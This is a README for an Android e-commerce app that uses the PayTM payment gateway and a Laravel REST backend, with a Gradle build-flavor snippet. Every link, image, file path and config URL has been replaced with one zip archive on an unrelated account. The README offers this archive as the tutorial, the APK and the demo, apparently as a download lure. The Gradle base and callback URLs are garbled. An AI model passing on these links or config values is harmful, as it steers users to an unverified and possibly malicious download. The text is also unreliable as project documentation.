Android E-Commerce app - PayTM Gateway
===================
Android simple e-commerce with PayTM payment gateway integrated.

| [Tutorial](https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip)      |  [Apk](https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip) | [Video Demo](https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip)|
|----------|--------|------|

![Android Ecommerce PayTM integration](https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip)

![Android Ecommerce PayTM integration](https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip)

Backend REST API
===================
This app uses the REST API built in Laravel to list down the products, manage orders and handling PayTM payment transactions.

Refer the [Laravel PayTM](https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip) project to know the REST API used for this project.

Changing the REST endpoint
===================
Currenlty this repo uses the demo REST API provided. You can build the backend project and change the base url in **https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip** file.
```gradle
productFlavors {
        dev {
            buildConfigField "String", "BASE_URL", "\"https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip\""
            buildConfigField "String", "PAYTM_CALLBACK_URL", "\"https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip%s\""
            buildConfigField "boolean", "IS_PATM_STAGIN", "true"
        }

        prod {
            buildConfigField "String", "BASE_URL", "\"https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip\""
            buildConfigField "String", "PAYTM_CALLBACK_URL", "\"https://raw.githubusercontent.com/Mukeem77/Android-E-Commerce-PayTM-master/master/clark/Android-E-Commerce-PayTM-master.zip%s\""
            buildConfigField "boolean", "IS_PATM_STAGIN", "false"
        }
    }
```